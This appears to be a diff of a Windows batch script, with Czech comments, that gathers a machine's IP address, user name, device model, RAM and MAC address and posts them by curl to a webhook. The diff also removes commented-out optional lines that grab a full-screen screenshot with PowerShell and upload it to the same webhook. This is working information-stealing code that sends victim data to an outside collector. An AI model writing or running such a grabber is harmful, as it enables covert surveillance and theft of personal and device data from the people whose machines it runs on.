@@ -26,10 +26,4 @@ curl -X POST -H "Content-Type: application/json" ^
 -d "{\"content\":\"📡 IP: !IP!\nČas: !DATUM!\nUživatel: !USER!\nZařízení: !DEVICE!\nModel: !MODEL!\nRAM: !RAM!\nMAC: !MAC!\"}" ^
 %webhook%
 
-:: 🖼️ (Volitelné) Screenshot – pokud chceš, lze přidat přes PowerShell nebo externí nástroj
-:: powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save('%TEMP%\screen.png');"
-
-:: 📤 (Volitelné) Odeslání screenshotu na webhook
-:: curl -X POST -F "file=@%TEMP%\screen.png" %webhook%
-
 exit
